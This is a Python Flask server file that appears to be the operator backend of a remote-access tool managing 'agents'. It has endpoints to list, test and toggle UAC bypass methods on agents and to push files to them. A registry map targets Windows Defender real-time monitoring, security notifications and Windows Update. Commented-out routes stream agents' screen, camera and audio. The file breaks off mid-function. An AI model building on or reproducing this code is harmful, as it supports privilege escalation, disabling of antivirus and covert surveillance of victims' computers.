def index():
    if is_authenticated():
        # Serve a single unified dashboard to avoid confusion between two UIs
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            runtime_overrides = (
                "<script>"
                "window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;"
                "window.__API_URL__ = window.__SOCKET_URL__;"
                "</script>"
            )
            if "</head>" in index_html:
                fav_png = '<link rel="icon" href="/favicon.png" type="image/png" sizes="64x64" />'
                fav_ico = '<link rel="shortcut icon" href="/neural.ico" type="image/x-icon" />'
                tags = fav_png + fav_ico
                if fav_png not in index_html and fav_ico not in index_html:
                    index_html = index_html.replace("<head>", "<head>" + tags)
                modified = index_html.replace("</head>", runtime_overrides + "</head>")
            else:
                # Fallback: prepend overrides at top
                tags = '<link rel="icon" href="/favicon.png" type="image/png" sizes="64x64" /><link rel="shortcut icon" href="/neural.ico" type="image/x-icon" />'
                modified = tags + runtime_overrides + index_html
            return Response(modified, mimetype='text/html')
        else:
            # If index.html isn't found, try direct asset inlining as a secondary strategy
            def find_asset(glob_pattern_candidates):
                for assets_dir, pattern in glob_pattern_candidates:
                    try:
                        if os.path.isdir(assets_dir):
                            for fname in sorted(os.listdir(assets_dir)):
                                if fname.startswith(pattern[0]) and fname.endswith(pattern[1]):
                                    return os.path.join(assets_dir, fname)
                    except Exception:
                        continue
                return None
            assets_dirs = [
                os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
            ]
            css_path = find_asset([(d, ('index-', '.css')) for d in assets_dirs])
            js_path = find_asset([(d, ('index-', '.js')) for d in assets_dirs])
            if not css_path or not js_path:
                raise FileNotFoundError('Built assets not found in assets directories')
            with open(css_path, 'r', encoding='utf-8', errors='replace') as f:
                css_inline = f.read()
            with open(js_path, 'r', encoding='utf-8', errors='replace') as f:
                js_bundle = f.read()
            runtime_overrides = """
            <script>
            window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;
            window.__API_URL__ = window.__SOCKET_URL__;
            </script>
            """
            html = f"""
            <!DOCTYPE html>
            <html lang=\"en\">
              <head>
                <meta charset=\"UTF-8\" />
                <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
                <link rel=\"icon\" href=\"/favicon.png\" type=\"image/png\" sizes=\"64x64\" />
                <link rel=\"shortcut icon\" href=\"/neural.ico\" type=\"image/x-icon\" />
                <title>Agent Controller</title>
                <style>{css_inline}</style>
                {runtime_overrides}
              </head>
              <body>
                <div id=\"root\"></div>
                <script type=\"module\">{js_bundle}</script>
              </body>
            </html>
            """
            return Response(html, mimetype='text/html')
    except Exception as e:
        print(f"Failed to inline dashboard, falling back to static file: {e}")
        # Fallback to static file if inline fails
        build_path = os.path.join(os.path.dirname(__file__), 'agent-controller ui v2.1', 'build', 'index.html')
        return send_file(build_path)

# Serve static assets for the UI v2.1
@app.route('/assets/<path:filename>')
def serve_assets(filename):
    base_dir = os.path.dirname(__file__)
    candidates = [
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
    ]
    for assets_dir in candidates:
        candidate_path = os.path.join(assets_dir, filename)
        if os.path.isfile(candidate_path):
            try:
                with open(candidate_path, 'rb') as f:
                    data = f.read()
                mime = 'text/css' if filename.endswith('.css') else 'application/javascript'
                return Response(data, mimetype=mime)
            except Exception:
                continue
    return ("Asset not found", 404)

@app.route('/debug-assets')
@require_auth
def debug_assets():
    base_dir = os.path.dirname(__file__)
    dirs = [
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
        os.path.join(base_dir, 'agent-controller ui', 'build'),
        os.path.join(base_dir, 'agent-controller ui', 'build', 'assets'),
    ]
    out = []
    for d in dirs:
        exists = os.path.isdir(d)
        files = []
        if exists:
            try:
                for fname in os.listdir(d):
                    fp = os.path.join(d, fname)
                    try:
                        size = os.path.getsize(fp)
                    except Exception:
                        size = None
                    files.append({'name': fname, 'size': size})
            except Exception:
                pass
        out.append({'dir': d, 'exists': exists, 'files': files})
    return jsonify(out)

@app.route('/favicon.png')
def serve_favicon_png():
    try:
        base_dir = os.path.dirname(__file__)
        icon_path = os.path.join(base_dir, 'neural.ico')
        try:
            from PIL import Image, ImageDraw
            import io
            size = 64
            im = Image.open(icon_path)
            im = im.convert('RGBA')
            im = im.resize((size, size), Image.LANCZOS)
            mask = Image.new('L', (size, size), 0)
            d = ImageDraw.Draw(mask)
            d.ellipse((0, 0, size, size), fill=255)
            out = Image.new('RGBA', (size, size), (0, 0, 0, 0))
            out.paste(im, (0, 0), mask=mask)
            buf = io.BytesIO()
            out.save(buf, format='PNG')
            buf.seek(0)
            return Response(buf.read(), mimetype='image/png')
        except Exception:
            pass
        return send_file(icon_path, mimetype='image/x-icon')
    except Exception:
        return ("", 404)

@app.route('/neural.ico')
def serve_neural_icon():
    try:
        base_dir = os.path.dirname(__file__)
        candidates = [
            os.path.join(base_dir, 'neural.ico'),
            os.path.join(base_dir, 'agent-controller ui v2.1', 'neural.ico'),
        ]
        for p in candidates:
            if os.path.isfile(p):
                return send_file(p, mimetype='image/x-icon')
    except Exception:
        pass
    return ("", 404)

@app.route('/favicon.ico')
def serve_favicon():
    return serve_neural_icon()
# --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
# 
# STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
# - Frame interval: 0.5 seconds (2 FPS)
# - Optimized for real-time monitoring with 0.5-second picture updates
# - Reduced latency and improved responsiveness
# - Better performance for monitoring applications
#

# VIDEO_FRAMES = defaultdict(lambda: None)
# CAMERA_FRAMES = defaultdict(lambda: None)
# AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

# Frame timing for real-time monitoring
# FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS

# HTTP streaming endpoints for browser compatibility (COMMENTED OUT)
# @app.route('/video_feed/<agent_id>')
# @require_auth
# def video_feed(agent_id):
#     """Stream video feed for a specific agent"""
#     def generate_video():
#         while True:
#             if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
#                 frame = VIDEO_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#1e40af')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_video(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/camera_feed/<agent_id>')
# @require_auth
# def camera_feed(agent_id):
#     """Stream camera feed for a specific agent"""
#     def generate_camera():
#         while True:
#             if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
#                 frame = CAMERA_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#059669')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_camera(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/audio_feed/<agent_id>')
# @require_auth
# def audio_feed(agent_id):
#     """Stream audio feed for a specific agent"""
#     def generate_audio():
#         while True:
#             if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
#                 frame = AUDIO_FRAMES_OPUS[agent_id]
#                 yield frame
#             else:
#                 # Send silence if no data available
#                 yield b'\x00' * 1024
#             time.sleep(0.1)  # 10 FPS for audio
#     
#     return Response(generate_audio(),
#                     mimetype='audio/wav',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# --- NEW API ENDPOINTS FOR MODERN UI ---

# Authentication API for frontend
@app.route('/api/auth/login', methods=['POST'])
def api_login():
    """API endpoint for frontend authentication"""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    password = request.json.get('password')
    otp_raw = request.json.get('otp')
    otp = re.sub(r'\D', '', str(otp_raw or ''))[:6]
    if not password:
        return jsonify({'error': 'Password is required'}), 400
    
    client_ip = get_client_ip()
    if is_ip_blocked(client_ip):
        try:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifySecurityAlert'):
                send_email_notification(
                    "Security Alert: Login Blocked",
                    f"Login attempt blocked for IP {client_ip} due to too many failed attempts."
                )
        except Exception:
            pass
        return jsonify({'error': 'Too many failed attempts. Try again later.'}), 429
    
    if verify_admin_or_operator(password):
        cfg = load_settings().get('authentication', {})
        require_two_factor = False
        trusted_ok = False
        try:
            token = request.cookies.get('trusted_device')
            if token:
                h = hashlib.sha256(token.encode()).hexdigest()
                lst = cfg.get('trustedDevices') or []
                trusted_ok = h in lst
        except Exception:
            trusted_ok = False
        supa_token = request.headers.get('X-Supabase-Token') or request.json.get('supabase_token')
        if SUPABASE_URL:
            live_b64 = supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
            setup_b64 = None if live_b64 else supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
            require_two_factor = bool(live_b64)
            if live_b64:
                if not otp and not trusted_ok:
                    return jsonify({'error': 'OTP required', 'requires_totp': True}), 401
                if otp:
                    try:
                        blob = base64.b64decode(live_b64 if isinstance(live_b64, str) else str(live_b64))
                        obj = json.loads(blob.decode('utf-8'))
                        enc, salt = obj.get('enc'), obj.get('salt')
                        secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
                    except Exception:
                        return jsonify({'error': 'Secret missing', 'requires_totp': True}), 403
                    ok = verify_totp_code(secret, str(otp), window=1)
                    if not ok:
                        record_failed_login(client_ip)
                        return jsonify({'error': 'Invalid OTP', 'requires_totp': True}), 401
            elif setup_b64:
                return jsonify({'error': 'Two-factor not enrolled', 'requires_totp': True}), 403
        else:
            # Local encrypted secret path
            enc = cfg.get('totpSecretEnc')
            salt = cfg.get('totpSalt')
            require_two_factor = bool(cfg.get('totpEnabled') or cfg.get('requireTwoFactor'))
            if require_two_factor:
                if not enc or not salt:
                    return jsonify({'error': 'Two-factor not enrolled', 'requires_totp': True}), 403
                if not otp and not trusted_ok:
                    return jsonify({'error': 'OTP required', 'requires_totp': True}), 401
                if otp:
                    secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
                    if not secret:
                        return jsonify({'error': 'TOTP secret missing', 'requires_totp': True}), 403
                    ok = verify_totp_code(secret, str(otp), window=1)
                    if not ok:
                        record_failed_login(client_ip)
                        return jsonify({'error': 'Invalid OTP', 'requires_totp': True}), 401
        # Clear failed attempts on successful login
        clear_login_attempts(client_ip)
        
        # Set session
        session.permanent = True
        session['authenticated'] = True
        session['otp_verified'] = True if (require_two_factor and (otp or trusted_ok)) else False        
        session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
        session['ip'] = client_ip
        
        return jsonify({
            'success': True,
            'message': 'Login successful',
            'session_timeout': Config.SESSION_TIMEOUT
        })
    else:
        # Record failed attempt
        record_failed_login(client_ip)
        return jsonify({'error': 'Invalid password'}), 401

@app.route('/api/auth/logout', methods=['POST'])
@require_auth
def api_logout():
    """API endpoint for frontend logout"""
    session.clear()
    return jsonify({'success': True, 'message': 'Logged out successfully'})

@app.route('/api/auth/status', methods=['GET'])
def api_auth_status():
    """Check authentication status for frontend"""
    authenticated = is_authenticated()
    if authenticated:
        return jsonify({
            'authenticated': True,
            'login_time': session.get('login_time'),
            'session_timeout': Config.SESSION_TIMEOUT
        })
    else:
        return jsonify({'authenticated': False})

@app.route('/api/auth/totp/status', methods=['GET'])
def api_totp_status():
    cfg = load_settings().get('authentication', {})
    issuer = cfg.get('issuer', 'Neural Control Hub')
    supa_token = request.headers.get('X-Supabase-Token') or request.args.get('supabase_token')
    enabled = False
    verified_once = False
    enrolled = False
    if SUPABASE_URL:
      s1 = supa_token and supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
      if not s1:
        s1 = supabase_rpc('get_totp_ciphertext_for_login_admin', {'user_uuid': ADMIN_USER_ID})
      if s1:
        enabled = True
        verified_once = True
        enrolled = True
      else:
        s2 = supa_token and supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
        if not s2:
          s2 = supabase_rpc('get_totp_setup_ciphertext_admin', {'user_uuid': ADMIN_USER_ID})
        enrolled = False
        verified_once = False
        enabled = False
    else:
      enabled = bool(cfg.get('totpEnabled'))
      verified_once = bool(cfg.get('totpVerifiedOnce'))
      enrolled = verified_once or bool(cfg.get('totpEnrolled'))
    failed = int(cfg.get('totpFailedAttempts') or 0)
    created = cfg.get('totpCreatedAt')
    return jsonify({'enabled': enabled, 'enrolled': enrolled, 'verified_once': verified_once, 'failed_attempts': failed, 'created_at': created, 'issuer': issuer})

def _parse_dict_from_client(var_name: str):
    try:
        if agent_client and hasattr(agent_client, var_name):
            d = getattr(agent_client, var_name) or {}
            return [{'key': k, 'enabled': bool(v)} for k, v in d.items()]
        path = os.path.join(os.getcwd(), 'client.py')
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        m = re.search(rf"{var_name}\s*=\s*\{{(.*?)\}}\s*", content, re.S)
        if not m:
            return []
        block = m.group(1)
        items = re.findall(r"'([^']+)'\s*:\s*(True|False)", block)
        return [{'key': k, 'enabled': v == 'True'} for k, v in items]
    except Exception:
        return []

def _parse_bypass_sequence():
    try:
        path = os.path.join(os.getcwd(), 'client.py')
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        m = re.search(r"def\s+get_bypass_methods_sequence\(\):\s*return\s*\[\s*(.*?)\s*\]", content, re.S)
        if not m:
            return []
        block = m.group(1)
        entries = re.findall(r"\{\s*'id':\s*(\d+),\s*'name':\s*'([^']+)'\s*\}", block)
        return [{'id': int(i), 'name': n} for i, n in entries]
    except Exception:
        return []

@app.route('/api/system/bypasses', methods=['GET'])
def api_system_bypasses():
    methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
    sequence = _parse_bypass_sequence()
    g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False)) if agent_client else False
    return jsonify({'methods': methods, 'sequence': sequence, 'global_enabled': g_enabled})

@app.route('/api/system/registry', methods=['GET'])
def api_system_registry():
    actions = _parse_dict_from_client('REGISTRY_ACTIONS')
    g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False)) if agent_client else False
    return jsonify({'actions': actions, 'global_enabled': g_enabled})

@app.route('/api/system/bypasses/test', methods=['POST'])
def api_system_bypasses_test():
    try:
        data = request.get_json(silent=True) or {}
        key = str(data.get('key') or '')
        if not key:
            return jsonify({'success': False, 'error': 'Missing key'}), 400
        if agent_client and hasattr(agent_client, 'debug_bypass_method'):
            res = agent_client.debug_bypass_method(key)
            return jsonify({'success': True, 'result': res})
        # Fallback: simulate based on parsed config
        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
        enabled = any(m['key'] == key and m['enabled'] for m in methods)
        return jsonify({'success': True, 'result': {'method': key, 'enabled': enabled, 'executed': enabled}})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/files/upload_b64', methods=['POST'])
@require_auth
def upload_file_b64(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    try:
        data = request.get_json(force=True) or {}
        filename = str(data.get('filename') or '').strip()
        content = str(data.get('content') or '')
        destination = str(data.get('destination') or '')
        operator_sid = str(data.get('socket_sid') or '')
        if not filename or not content:
            return jsonify({'error': 'filename and content required'}), 400
        upload_id = f"ul_{int(time.time())}_{secrets.token_hex(4)}"
        if operator_sid:
            UPLOAD_REQUESTERS[upload_id] = operator_sid
        # decode to temp and forward using same path
        base_dir = os.path.join(os.getcwd(), 'uploads', 'http')
        os.makedirs(base_dir, exist_ok=True)
        temp_path = os.path.join(base_dir, f"{upload_id}_{os.path.basename(filename)}")
        raw = base64.b64decode(content)
        with open(temp_path, 'wb') as f:
            f.write(raw)
        try:
            socketio.emit('upload_file_start', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'filename': os.path.basename(filename),
                'destination': destination,
                'total_size': os.path.getsize(temp_path)
            }, room=agent_sid)
            # forward chunks
            chunk_size = 512 * 1024
            total_size = os.path.getsize(temp_path)
            with open(temp_path, 'rb') as fin:
                off = 0
                while True:
                    c = fin.read(chunk_size)
                    if not c:
                        break
                    b64 = base64.b64encode(c).decode('utf-8')
                    socketio.emit('upload_file_chunk', {
                        'agent_id': agent_id,
                        'upload_id': upload_id,
                        'filename': os.path.basename(filename),
                        'destination': destination,
                        'total_size': total_size,
                        'chunk': b64,
                        'offset': off
                    }, room=agent_sid)
                    _upload_debug_log(upload_id, f"server_chunk off={off} len={len(c)}")
                    off += len(c)
                    try:
                        prog = int(min(100, (off / float(total_size or 1)) * 100))
                        sid = UPLOAD_REQUESTERS.get(upload_id) or operator_sid or None
                        resolved = _resolve_destination_for_agent(destination)
                        payload = {
                            'agent_id': agent_id,
                            'upload_id': upload_id,
                            'filename': os.path.basename(filename),
                            'destination_path': resolved,
                            'received': off,
                            'total': total_size,
                            'progress': prog,
                            'source': 'server'
                        }
                        if sid:
                            socketio.emit('file_upload_progress', payload, room=sid)
                        socketio.emit('file_upload_progress', payload, room='operators')
                    except Exception:
                        pass
            socketio.emit('upload_file_complete', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'filename': os.path.basename(filename),
                'destination': destination,
                'total_size': os.path.getsize(temp_path)
            }, room=agent_sid)
            _upload_debug_log(upload_id, "server_complete")
            try:
                sid = UPLOAD_REQUESTERS.get(upload_id) or operator_sid or None
                resolved = _resolve_destination_for_agent(destination)
                complete_payload = {
                    'agent_id': agent_id,
                    'upload_id': upload_id,
                    'filename': os.path.basename(filename),
                    'destination_path': resolved,
                    'size': os.path.getsize(temp_path),
                    'success': True,
                    'source': 'server'
                }
                if sid:
                    socketio.emit('file_upload_complete', complete_payload, room=sid)
                socketio.emit('file_upload_complete', complete_payload, room='operators')
            except Exception:
                pass
        finally:
            try: os.remove(temp_path)
            except Exception: pass
        return jsonify({'success': True, 'upload_id': upload_id, 'filename': filename})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/uploads/<upload_id>/status', methods=['GET'])
@require_auth
def upload_status(upload_id):
    s = UPLOAD_STATUS.get(upload_id) or {}
    return jsonify({'success': True, 'status': s})

@app.route('/api/system/registry/test', methods=['POST'])
def api_system_registry_test():
    try:
        data = request.get_json(silent=True) or {}
        key = str(data.get('key') or '')
        agent_id = data.get('agent_id')
        if not key:
            return jsonify({'success': False, 'error': 'Missing key'}), 400
        if agent_id:
            need_admin = not bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
            enabled = bool(AGENT_OVERRIDES['registry'].get(agent_id, {}).get(key, False))
            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
            executed = enabled and g_enabled and not need_admin
            return jsonify({'success': True, 'result': {'action': key, 'enabled': enabled, 'executed': executed, 'need_admin': need_admin}})
        if agent_client and hasattr(agent_client, 'debug_registry_action'):
            res = agent_client.debug_registry_action(key)
            return jsonify({'success': True, 'result': res})
        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
        enabled = any(a['key'] == key and a['enabled'] for a in actions)
        return jsonify({'success': True, 'result': {'action': key, 'enabled': enabled, 'executed': enabled}})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/registry/presence', methods=['POST'])
def api_system_registry_presence():
    try:
        data = request.get_json(silent=True) or {}
        key = str(data.get('key') or '')
        agent_id = data.get('agent_id')
        
        if not key:
            return jsonify({'success': False, 'error': 'Missing key'}), 400
            
        if agent_id:
            items = data.get('items')
            if not isinstance(items, list) or not items:
                mapping = {
                    'policy_push_notifications': {'id': 'policy_push_notifications', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\PushNotifications", 'key': 'NoCloudApplicationNotification'},
                    'policy_windows_update': {'id': 'policy_windows_update', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate", 'key': 'DisableOSUpgrade'},
                    'context_runas_cmd': {'id': 'context_runas_cmd', 'hive': 'HKCU', 'path': r"Software\Classes\Directory\Background\shell\runas_cmd", 'key': ''},
                    'context_powershell_admin': {'id': 'context_powershell_admin', 'hive': 'HKCU', 'path': r"Software\Classes\Directory\Background\shell\powershell_admin", 'key': ''},
                    'notify_center_hkcu': {'id': 'notify_center_hkcu', 'hive': 'HKCU', 'path': r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", 'key': 'ToastEnabled'},
                    'notify_center_hklm': {'id': 'notify_center_hklm', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\PushNotifications", 'key': 'NoCloudApplicationNotification'},
                    'defender_ux_suppress': {'id': 'defender_ux_suppress', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration", 'key': 'Notification_Suppress'},
                    'toast_global_above_lock': {'id': 'toast_global_above_lock', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\System", 'key': 'DisableLockScreenAppNotifications'},
                    'toast_global_critical_above_lock': {'id': 'toast_global_critical_above_lock', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\System", 'key': 'EnableLockScreenAppNotifications'},
                    'toast_windows_update': {'id': 'toast_windows_update', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate", 'key': 'DoNotConnectToWindowsUpdateInternetLocations'},
                    'toast_security_maintenance': {'id': 'toast_security_maintenance', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\SecurityHealth", 'key': 'SuppressNotifications'},
                    'toast_windows_security': {'id': 'toast_windows_security', 'hive': 'HKLM', 'path': r"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications", 'key': 'EnableNotifications'},
                    'toast_sec_health_ui': {'id': 'toast_sec_health_ui', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\SecurityHealth", 'key': 'SuppressNotifications'},
                    'explorer_balloon_tips': {'id': 'explorer_balloon_tips', 'hive': 'HKCU', 'path': r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 'key': 'EnableBalloonTips'},
                    'explorer_info_tip': {'id': 'explorer_info_tip', 'hive': 'HKCU', 'path': r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 'key': 'ShowInfoTip'},
                    'disableRealtimeMonitoring': {'id': 'disableRealtimeMonitoring', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 'key': 'DisableRealtimeMonitoring'},
                }
                if key in mapping:
                    items = [mapping[key]]
                else:
                    items = [{'id': key, 'hive': 'HKLM', 'path': r"SOFTWARE\Microsoft\Windows", 'key': ''}]
            try:
                import json as _json
                payload = _json.dumps(items)
            except Exception:
                return jsonify({'success': False, 'error': 'Invalid items payload'}), 400
            r = execute_command_internal(agent_id, f"check-registry:{payload}")
            if r.get('status') == 'sent':
                return jsonify({'success': True, 'result': {'present': None, 'message': 'Remote check initiated', 'execution_id': r.get('execution_id')}})
            return jsonify({'success': False, 'error': r.get('message') or 'Failed to send command'}), 400

        if agent_client and hasattr(agent_client, 'check_registry_presence'):
            res = agent_client.check_registry_presence(key)
            return jsonify({'success': True, 'result': res})
            
        return jsonify({'success': False, 'error': 'Client capability not available'}), 503
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/bypasses/toggle', methods=['POST'])
def api_system_bypasses_toggle():
    try:
        data = request.get_json(silent=True) or {}
        key = data.get('key')
        enabled = data.get('enabled')
        global_enabled = data.get('global_enabled')
        agent_id = data.get('agent_id')
        
        # Log the request for debugging
        logger.info(f"Bypass toggle request - agent_id: {agent_id}, key: {key}, enabled: {enabled}, global_enabled: {global_enabled}")
        
        # Validate input
        if not data:
            logger.warning("Empty request data for bypass toggle")
            return jsonify({'success': False, 'error': 'Missing request data'}), 400
            
        # For global operations, key and enabled can be None, but we need at least one of: key, enabled, or global_enabled
        if key is None and enabled is None and global_enabled is None:
            logger.warning("Missing parameters for bypass toggle - need at least key, enabled, or global_enabled")
            return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
            
        if key is not None and not isinstance(key, str):
            logger.warning(f"Invalid key type for bypass toggle: {type(key)}")
            return jsonify({'success': False, 'error': 'Invalid key format'}), 400
            
        if enabled is not None and not isinstance(enabled, bool):
            logger.warning(f"Invalid enabled type for bypass toggle: {type(enabled)}")
            return jsonify({'success': False, 'error': 'Invalid enabled format'}), 400
            
        if agent_id and not isinstance(agent_id, str):
            logger.warning(f"Invalid agent_id type for bypass toggle: {type(agent_id)}")
            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
            
        if global_enabled is not None and not isinstance(global_enabled, bool):
            logger.warning(f"Invalid global_enabled type for bypass toggle: {type(global_enabled)}")
            return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
        
        # Apply changes to agent client if available
        if agent_client:
            if isinstance(global_enabled, bool):
                try:
                    agent_client.BYPASSES_ENABLED = global_enabled
                    agent_client.DISABLE_UAC_BYPASS = not global_enabled
                    logger.info(f"Updated global bypasses to {global_enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update global bypasses in agent client: {e}")
                    
            if key:
                try:
                    agent_client.UAC_BYPASS_METHODS_ENABLED[key] = enabled
                    logger.info(f"Updated bypass {key} to {enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update bypass {key} in agent client: {e}")
                    
        # Apply changes to agent overrides
        if agent_id:
            if isinstance(global_enabled, bool):
                AGENT_OVERRIDES['flags']['bypasses'][agent_id] = global_enabled
                logger.info(f"Updated global bypasses flag for agent {agent_id} to {global_enabled}")
            if key:
                AGENT_OVERRIDES['bypasses'].setdefault(agent_id, {})[key] = enabled
                logger.info(f"Updated bypass {key} for agent {agent_id} to {enabled}")
                
        # Get current state
        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
        g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False))
        
        if agent_id:
            g_enabled = bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False))
            merged = {m['key']: m['enabled'] for m in methods}
            merged.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
            methods = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
            logger.info(f"Returning merged bypass state for agent {agent_id}: {len(methods)} methods, global_enabled: {g_enabled}")
        else:
            logger.info(f"Returning global bypass state: {len(methods)} methods, global_enabled: {g_enabled}")
            
        return jsonify({'success': True, 'methods': methods, 'global_enabled': g_enabled})
        
    except Exception as e:
        logger.error(f"Error in api_system_bypasses_toggle: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/system/registry/toggle', methods=['POST'])
def api_system_registry_toggle():
    try:
        data = request.get_json(silent=True) or {}
